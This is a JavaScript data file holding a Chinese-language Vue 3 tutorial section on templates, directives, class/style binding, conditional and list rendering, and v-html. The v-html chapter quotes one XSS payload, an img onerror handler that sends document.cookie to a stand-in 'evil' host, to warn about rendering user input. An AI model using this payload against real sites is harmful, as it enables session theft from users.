/* 第 2 篇 · 模板与渲染 */
(window.VUE_PARTS = window.VUE_PARTS || []).push({
  id: 'p2',
  order: 2,
  title: '模板与渲染',
  range: '006–017',
  desc: '插值、指令、class/style、条件与列表——把「数据怎么变成页面」彻底摸清',
  chapters: [
    {
      no: 5,
      title: '插值与 v-bind：两条绑定主线',
      lessons: '006–007',
      summary: '文本用双大括号，属性用 v-bind；混用是新手最常犯的错误。',
      points: [
        '双大括号只做文本插值，不能用于 HTML 属性',
        'v-bind 绑定属性，值为 null / undefined 时属性被移除',
        '表达式里写的是单个 JS 表达式，不是语句',
        'v-bind 可整体绑定一个对象，属性名与对象键一一对应'
      ],
      body: `### 插值只能进「文本位置」

\`\`\`html
<span>Message: {{ msg }}</span>
\`\`\`

双大括号会被替换为组件实例上 \`msg\` 的值，并且 \`msg\` 变化时同步更新。它的作用域只有一处：**元素的内容区**。

所以下面这种写法是错误的：

\`\`\`html
<!-- ❌ 双大括号在属性里不会编译 -->
<div id="{{ dynamicId }}"></div>

<!-- ✅ 用 v-bind，简写为 : -->
<div :id="dynamicId"></div>
\`\`\`

错误写法的表现是浏览器把 \`{{ dynamicId }}\` 当成普通字符串塞进 id，页面不报错，但绑定完全失效——比报错更难查。

### v-bind 的三个细节

\`\`\`html
<div :id="dynamicId" :title="null" :data-ok="false"></div>
\`\`\`

1. 值为 \`null\` 或 \`undefined\` 时，该属性会从渲染结果中**移除**（\`title\` 会消失）。
2. 值为 \`false\` 时，对布尔属性（\`disabled\`、\`checked\`）表示不设置，对普通属性会输出字符串 \`"false"\`。这个差别在处理表单禁用状态时很关键。
3. 属性名是大小写不敏感的：DOM 里会用小写，所以 \`:viewBox\` 这类 SVG 属性要写在 \`<svg>\` 的绑定对象里，或者用 \`v-bind\` 对象语法。

### 表达式能写什么，不能写什么

模板里支持**单个表达式**：三元、方法调用、字符串拼接、模板字符串都行；不支持语句（\`if\`、\`for\`、变量声明）。

\`\`\`html
{{ number + 1 }}
{{ ok ? 'YES' : 'NO' }}
{{ message.split('').reverse().join('') }}
<div :id="'list-' + id"></div>
\`\`\`

表达式的能力边界，其实是在提醒你：**逻辑该放到计算属性里**。一旦出现三层嵌套的三元，就该挪到 \`computed\`（第 3.4 章详述），模板只负责展示结果。

### 对象语法：一次绑定多个属性

\`\`\`html
<Navbar v-bind="{ title: '我的电影', left: '返回', right: '首页' }"></Navbar>
\`\`\`

好处是属性可以来自一个配置对象，方便按条件批量透传；坏处是模板里看不出有哪些属性，IDE 也难提示。业务组件建议逐个写，只有「透传一层配置」的场景才用对象语法。

### 三个容易记混的简写

| 完整写法 | 简写 | 用途 |
| --- | --- | --- |
| \`v-bind:value="x"\` | \`:value="x"\` | 单向绑定属性 / prop |
| \`v-on:click="fn"\` | \`@click="fn"\` | 绑定事件 |
| \`v-slot:header\` | \`#header\` | 具名插槽（第 5.7 章） |

> 💡 \`:\` 开头表示「值要当作 JS 求值」，不加冒号就是静态字符串。\`:id="1"\` 得到 id="1"，\`:id="'1'"\` 才得到字符串；把 \`id="1"\` 写成 \`:id="1"\` 也碰巧对，但 \`:title="hello"\` 会直接报未定义变量。`
    },
    {
      no: 6,
      title: '指令与简写：TodoList 的最小闭环',
      lessons: '007–008',
      summary: '一个 TodoList 只用四个指令，却覆盖了「输入 → 渲染 → 事件 → 增删」的完整链路。',
      points: [
        '指令是带 v- 前缀的特殊属性，值是一个表达式',
        'v-model 是语法糖，本质是 :value + @input',
        '事件处理函数里可以用 this 访问 data 与 methods',
        '数组用 push / splice 增删，响应式会自动跟进'
      ],
      body: `### 指令是什么

指令（directive）是 Vue 给 HTML 属性扩展出的一套语法：\`v-for\`、\`v-if\`、\`v-model\` 等都是内置指令，值是一个 JS 表达式。渲染时 Vue 会读取这些属性，把「描述」翻译成真实的 DOM 操作。

一个最小可用的 TodoList 只用到四个：

\`\`\`html
<div id="box">
  <input type="text" v-model="mytext">
  <button @click="handleAdd">add</button>
  <ul>
    <li v-for="(data, index) in datalist" :key="data.id">
      {{ data.title }}
      <button @click="handleDel(index)">del</button>
    </li>
  </ul>
</div>

<script>
  Vue.createApp({
    data() {
      return {
        mytext: '',
        datalist: []
      }
    },
    methods: {
      handleAdd() {
        if (!this.mytext.trim()) return
        this.datalist.push({ id: Date.now(), title: this.mytext })
        this.mytext = ''
      },
      handleDel(index) {
        this.datalist.splice(index, 1)
      }
    }
  }).mount('#box')
</script>
\`\`\`

### 这条链路里的四个环节

| 环节 | 依赖 | 说明 |
| --- | --- | --- |
| 输入 | \`v-model\` | 输入框的值与 \`mytext\` 双向同步 |
| 触发 | \`@click\` | 调用 methods 里的方法 |
| 渲染 | \`v-for\` | 数据数组变化就重渲染列表 |
| 增删 | \`push\` / \`splice\` | 属于被 Vue 拦截的变更方法 |

值得注意：\`v-model\` 并不是什么魔法，它会被编译成 \`:value\` + \`@input\` 的组合。理解这一点，第 5.5 章「组件上的 v-model」就不用重新学一遍。

### 为什么 index 不适合当 key

上面的例子为了简短用了 \`index\`，但真实业务要用**稳定唯一的 id**。原因在 2.6 章会详细展开，这里先记住结论：用 index 做 key 时，删除中间项会导致后续所有项的 key 平移，输入框内容、勾选状态都会错位。

### 一个常见误判：methods 里的 this

\`\`\`js
methods: {
  handleAdd() {
    this.datalist.push(...)     // ✅ this 指向组件实例
  }
}
// 箭头函数写法拿不到组件实例
methods: {
  handleAdd: () => {
    this.datalist.push(...)     // ❌ this 不是组件实例
  }
}
\`\`\`

原因不复杂：Vue 在调用 methods 时用 \`fn.call(vm)\` 绑定，而箭头函数不绑定自己的 \`this\`，会沿用外层作用域。选项式 API 里，methods 一律写普通函数。

> ⚠️ 不要直接 \`datalist[index].done = true\` 就以为万无一失——对象属性的修改在 Vue 3 里是响应式的，但如果把对象整体替换成新对象，记得替换的是数组元素而不是数组本身。数组替换的问题在 2.7 章讲。

### 把案例读成「状态设计」练习

写这个案例时真正要练的不是指令语法，而是**状态够不够**：\`mytext\` 是输入态，\`datalist\` 是数据态，没有多余状态。后面购物车案例会加 \`checkList\`、\`isAllChecked\`，这两个其实是**派生状态**，能用计算属性推出来的就不该单独存——这是第 3 章的核心主题。`
    },
    {
      no: 8,
      title: 'class 与 style 绑定',
      lessons: '009、011–012',
      summary: '两者都支持对象与数组语法；对象语法管开关，数组语法管组合。',
      points: [
        'class 对象语法：键是类名，值是布尔开关',
        'class 数组语法：元素是变量或三元表达式',
        'style 对象语法用驼峰命名，数组语法用于叠加多组样式',
        '绑定结果会与元素上原有的 class 合并，不覆盖'
      ],
      body: `### class 对象语法：一个类名一个开关

\`\`\`vue
<div :class="{ active: isActive, 'text-danger': hasError }"></div>
\`\`\`

\`isActive\` 为真时加上 \`active\`，为假时移除。带连字符的类名要加引号，否则会被当成减法。这是最常用的写法，因为「列表选中态」本质就是一组互斥的开关：

\`\`\`vue
<ul>
  <li
    v-for="(item, index) in datalist"
    :key="item.id"
    :class="{ active: current === index }"
    @click="current = index"
  >
    {{ item }}
  </li>
</ul>
\`\`\`

### class 数组语法：组合多个来源

\`\`\`vue
<div :class="[activeClass, errorClass, isBig ? 'is-big' : '']"></div>
\`\`\`

数组里的 falsy 值会被忽略，所以 \`isBig ? 'is-big' : ''\` 不会输出空类名。适合「基础类 + 状态类 + 主题类」这种多层拼装。

两种语法还能混用：

\`\`\`vue
<div class="card" :class="[{ 'is-active': active }, themeClass]"></div>
\`\`\`

静态的 \`card\` 与动态结果合并，不会互相覆盖——这一点和原生 \`setAttribute('class')\` 完全不同，Vue 会做合并而不是替换。

### style 对象语法

\`\`\`vue
<div :style="{ color: 'red', fontSize: '13px' }"></div>
\`\`\`

CSS 属性名用**驼峰**（\`fontSize\`）或**引号包裹的连字符**（\`'font-size'\`）。值为 \`null\` / \`undefined\` 时该条样式被移除，正好可以用三元做条件样式。

数组语法用于叠加多组：

\`\`\`vue
<div :style="[baseStyle, overrideStyle]"></div>
\`\`\`

后者覆盖前者的同名属性，类似 \`Object.assign\` 的效果。

### 该用 class 还是 style

| 需求 | 推荐 | 原因 |
| --- | --- | --- |
| 选中态、禁用态、主题 | class | 样式集中在 CSS 里，可被覆盖、可复用 |
| 由数据决定的宽度 / 进度 / 位置 | style | 值算不出来写不进 CSS |
| 大量静态样式 | 普通 class | 不要在模板里堆对象 |

一个实用判断：**能穷举的用 class，算出来的用 style**。进度条宽度、拖拽位置属于后者；按钮的 hover、选中、禁用属于前者。

> 💡 动态背景图这类需求常写成 \`:style="{ backgroundImage: 'url(' + url + ')' }"\`。注意字符串拼接容易漏引号，推荐用对象数组统一组装，便于复用与条件合并。

### 与案例的关系

前面「点击变色」案例，本质上就是 \`current\` 这个索引 + \`:class\` 对象语法。把 \`current\` 换成一个布尔数组，就变成了多选；换成 \`Set\`，就支持了反选。**状态结构决定模板复杂度**，这也是后面组件设计要反复用到的思路。`
    },
    {
      no: 7,
      title: 'v-html 与模板的边界',
      lessons: '010',
      summary: '插值永远是纯文本；要渲染 HTML 只能用 v-html，而它自带 XSS 风险。',
      points: [
        '双大括号会把 HTML 当纯文本转义输出',
        'v-html 直接写入 innerHTML，不做任何转义',
        '绝不要把用户输入丢给 v-html',
        '能用插值 + 样式解决的需求，不要用 v-html'
      ],
      body: `### 先看清默认行为

\`\`\`html
<p>插值：{{ rawHtml }}</p>
<p>v-html：<span v-html="rawHtml"></span></p>
\`\`\`

假设 \`rawHtml = '<b>hello</b>'\`，第一行页面显示的是字面量 \`<b>hello</b>\`，第二行显示**加粗的 hello**。差别在于：插值走的是 \`textContent\`，\`v-html\` 走的是 \`innerHTML\`。

### 为什么 v-html 危险

\`\`\`js
// 假设内容来自用户评论
const comment = '<img src=x onerror="fetch(\\'//evil?c=\\'+document.cookie)">'
\`\`\`

这段字符串一旦进入 \`v-html\`，图片加载失败触发 \`onerror\`，cookie 就被发到第三方。这就是 XSS（跨站脚本）。Vue 的文档写了明确警告：**在网站上动态渲染任意 HTML 极其危险，容易导致 XSS 攻击，只应在可信内容上使用，绝不要用在用户输入上**。

| 场景 | 能否用 v-html | 建议 |
| --- | --- | --- |
| 后台富文本编辑器输出 | 可以，但需服务端白名单过滤 | 配合 DOMPurify |
| 用户评论 / 昵称 | 不可以 | 用插值，换行用 \`white-space: pre-line\` |
| 简单强调 | 不需要 | 拆成多个元素 + class |
| 第三方 SDK 注入的片段 | 视情况 | 优先用组件封装 |

### 需要「带样式的富文本」怎么办

三个层次，从安全到灵活：

1. **结构简单**：拆成几个元素，用 \`v-if\` 控制显示，颜色字号交给 class。
2. **需要换行**：插值 + \`white-space: pre-line\`，零风险。
3. **真需要 HTML**：服务端或前端用白名单库过滤（如 DOMPurify），再交给 \`v-html\`。

\`\`\`js
import DOMPurify from 'dompurify'
const safe = DOMPurify.sanitize(userInput)   // 过滤掉 script / onerror 等
\`\`\`

> ⚠️ 前端过滤只是第二道防线。真正的边界在服务端：凡是入库前能过滤的，就不要等到渲染时再补救。

### 顺带说清 v-text 与 v-pre

- \`v-text="msg"\`：等价于插值，但会**覆盖元素原有子节点**，可读性更差，一般直接用 \`{{ }}\`。
- \`v-pre\`：跳过编译，原样输出双大括号。用于展示 Vue 代码片段，或者跳过不含指令的大段静态内容以省一点编译开销。`
    },
    {
      no: 9,
      title: '条件渲染：v-if 与 v-show 的取舍',
      lessons: '013',
      summary: 'v-if 是真销毁真重建，v-show 只切 display；按「切换频率」选，不按「习惯」选。',
      points: [
        'v-if 惰性：首次为假时什么都不渲染',
        'v-if 切换会销毁并重建子组件与事件监听',
        'v-show 始终渲染，只切换 display 属性',
        'v-if 可与 v-else-if / v-else 组成分支链'
      ],
      body: `### 两种「不显示」，机制完全不同

\`\`\`vue
<h1 v-if="awesome">Vue is awesome!</h1>
<h1 v-show="awesome">Vue is awesome!</h1>
\`\`\`

- \`v-if\`：条件为假时，对应区块**不被渲染到 DOM 中**；条件变真才创建。它是惰性的，首次为假就什么都不做。
- \`v-show\`：元素**始终渲染**，只是给个 \`display: none\`；切换时只改一个 CSS 属性。

由此推出性能差异：\`v-if\` 切换开销高（销毁 / 重建 DOM 与组件实例），初始渲染开销低；\`v-show\` 初始开销高（无论如何先渲染），切换开销低。

| 判断条件 | 选择 |
| --- | --- |
| 运行时很少变（权限、角色） | v-if |
| 频繁切换（tab、折叠面板） | v-show |
| 内容里包含重型组件或大量 DOM | 优先 v-show，避免反复重建 |
| 需要配合 \`<template>\` 包裹多个节点 | v-if |

### 分支链与 template

\`\`\`vue
<div v-if="state === 0">未付款</div>
<div v-else-if="state === 1">未发货</div>
<div v-else-if="state === 2">已发货</div>
<div v-else>已完成</div>
\`\`\`

分支链要求相邻，中间不能插入其他元素。如果要同时控制多个节点，用 \`<template>\` 包裹——它不会被渲染成真实元素：

\`\`\`vue
<template v-if="ok">
  <h1>标题</h1>
  <p>段落</p>
</template>
\`\`\`

### v-if 与 v-for 不要同级

\`\`\`vue
<!-- ❌ 可读性差，且优先级容易记反 -->
<li v-for="item in list" v-if="item.state === 1">...</li>

<!-- ✅ 先用计算属性过滤，再渲染 -->
<li v-for="item in activeList" :key="item.id">...</li>
\`\`\`

在 Vue 3 中，\`v-if\` 的优先级**高于** \`v-for\`，也就是 \`v-if\` 拿不到 \`item\`，会直接报错。Vue 2 相反，所以从 2 迁移过来的人特别容易踩。正确做法是用 \`computed\` 先筛出需要的列表。

> ⚠️ \`v-show\` 不支持 \`<template>\`，也不支持 \`v-else\`。它只作用于单个元素。

### 一个常被忽略的副作用

\`v-if\` 切换会**重新执行子组件的 created / mounted**，所以表单里用 \`v-if\` 控制步骤切换时，用户填的内容会丢。要保留状态，两个办法：用 \`v-show\`，或者用 \`<KeepAlive>\` 缓存组件（第 5.4 章）。`
    },
    {
      no: 10,
      title: 'v-for 与 key：就地更新的代价',
      lessons: '014–015',
      summary: 'v-for 决定「渲染几个」，key 决定「更新时复用哪个」；用 index 当 key 会复用错对象。',
      points: [
        'v-for 支持数组、对象、数字区间三种数据源',
        '默认就地更新：不移动 DOM，只改内容',
        'key 让 Vue 能追踪节点身份，从而正确复用与重排',
        '列表项有内部状态时，必须用稳定唯一的 id 作 key'
      ],
      body: `### 三种数据源

\`\`\`vue
<!-- 数组：值 + 索引 -->
<li v-for="(item, index) in list" :key="item.id">{{ index }} - {{ item.title }}</li>

<!-- 对象：值 + 键 + 索引 -->
<li v-for="(value, key, index) in obj">{{ key }}: {{ value }}</li>

<!-- 数字区间：1 到 n -->
<span v-for="n in 5" :key="n">{{ n }}</span>
\`\`\`

对象的遍历顺序遵循 \`Object.keys\` 的顺序，不要依赖「插入顺序」做业务逻辑。

### 就地更新是什么意思

假设列表是 \`[A, B, C]\`，现在变成 \`[A, C]\`（删了 B）。Vue 的默认策略是**不移动 DOM**，而是复用现有的三个 \`<li>\`，把内容依次改写成 A、C，再把多余的删掉。

对纯文本没问题；一旦 \`<li>\` 里有输入框、勾选框、动画状态，就会错位：

| 列表 | 删除前 | 就地更新后 | 用户看到 |
| --- | --- | --- | --- |
| 带输入框 | A(值1) B(值2) C(值3) | A(值1) C(值3) | 输入框内容跑到别的行上 |

加了 \`key\` 之后，Vue 知道「B 这个节点消失了」，会直接删掉 B 对应的真实节点，A 和 C 的 DOM 原样保留，输入框内容也就不会串位。

### key 怎么选

- **唯一且稳定**：数据库 id、\`Date.now()\` 生成的 id、uuid。
- **不要用 index**：删除或排序后索引会变，key 跟着变，等于没加。
- **不要用随机数**：每次渲染都变，会导致整列重建，性能更差。

\`\`\`vue
<!-- ✅ -->
<li v-for="item in list" :key="item.id">

<!-- ❌ 排序 / 删除后全部错位 -->
<li v-for="item in list" :key="index">
\`\`\`

只有在**列表纯静态、永远不重排**时，index 才是安全的。

### diff 大致在做什么

把新老虚拟节点树按层比较，列表节点先做首尾交叉比对；首尾都对不上时，用 key 建映射表查找可复用节点（\`Map\` 查找是 O(1)，遍历查找是 O(n)）。所以 key 不只是「防 bug」，也是「让 diff 从 O(n²) 回到 O(n)」的关键。

完整流程在第 10.9 章展开，这里记住一句：**key 是节点身份证，不是循环变量**。

> 💡 \`<template v-for>\` 可以把多个兄弟节点包成一组渲染，此时 \`key\` 要写在 \`<template>\` 上，而不是内部元素上。`
    },
    {
      no: 11,
      title: '数组变动侦测与模糊搜索案例',
      lessons: '016–017',
      summary: '七个变更方法会被拦截，不可变方法必须替换整个数组；两种过滤写法各有取舍。',
      points: [
        'push/pop/shift/unshift/splice/sort/reverse 会被拦截',
        'filter/concat/slice 返回新数组，需整体替换才更新',
        '方案一：模板内 v-if 过滤，简单但有浪费',
        '方案二：计算属性过滤，数据不变就不重算'
      ],
      body: `### 被拦截的七个方法

\`\`\`js
// 这些方法会修改原数组，Vue 拦截后自动触发更新
list.push(item)
list.pop()
list.shift()
list.unshift(item)
list.splice(index, 1)
list.sort((a, b) => a.price - b.price)
list.reverse()
\`\`\`

Vue 3 用 Proxy 代理数组对象，所以 \`list[0] = 'x'\` 也能被侦测到（Vue 2 不行）。但**长度赋值** \`list.length = 0\` 依然不是响应式的推荐写法，用 \`list.splice(0)\` 更稳。

### 不可变方法要整体替换

\`\`\`js
// ❌ filter 返回新数组，原数组没变，视图不动
this.list.filter((item) => item.price > 100)

// ✅ 把返回值赋回去
this.list = this.list.filter((item) => item.price > 100)
\`\`\`

\`filter\`、\`concat\`、\`slice\`、\`map\` 都不改原数组。这是函数式编程的习惯，Vue 并不特殊对待——赋值给响应式属性，才会触发更新。

### 模糊搜索：两种写法

需求：输入关键字，实时过滤列表。

**方案一：模板里条件渲染**

\`\`\`vue
<input v-model="mytext" />
<ul>
  <template v-for="item in datalist" :key="item">
    <li v-if="item.includes(mytext)">{{ item }}</li>
  </template>
</ul>
\`\`\`

优点是改动最小，缺点是**每项都要判断一次**，列表大时浪费；而且 \`v-if\` 与 \`v-for\` 同级，可读性一般。

**方案二：用方法或计算属性先过滤**

\`\`\`vue
<input v-model="mytext" />
<ul>
  <li v-for="item in filterList" :key="item">{{ item }}</li>
</ul>

<script>
  export default {
    data() {
      return { mytext: '', datalist: ['aaa', 'abb', 'aab', 'bcc', 'abc'] }
    },
    computed: {
      filterList() {
        return this.datalist.filter((item) => item.includes(this.mytext))
      }
    }
  }
</script>
\`\`\`

方案二把「过滤」这件业务逻辑从模板里挪出来，模板只负责渲染结果。\`computed\` 还会缓存：关键字没变、列表没变，就不会重复过滤。

| 对比 | 模板过滤 | 计算属性过滤 |
| --- | --- | --- |
| 模板可读性 | 差（逻辑混在结构里） | 好 |
| 重复渲染 | 每项都判断 | 只算一次并缓存 |
| 可测试性 | 无法单测 | 可以单独测 |
| 改动成本 | 小 | 略大 |

### 从案例里提炼两条经验

1. **派生数据不要存**：筛选结果、合计金额、全选状态，都应是 \`computed\` 的产物，而不是又一个 \`data\` 字段。
2. **数组操作要么用变更方法，要么整体替换**：这是 Vue 响应式最容易出错的地方，也是面试高频题。

> 💡 中文搜索记得统一大小写与空格：\`item.toLowerCase().includes(key.trim().toLowerCase())\`，否则用户输大写就搜不到。`
    }
  ]
});
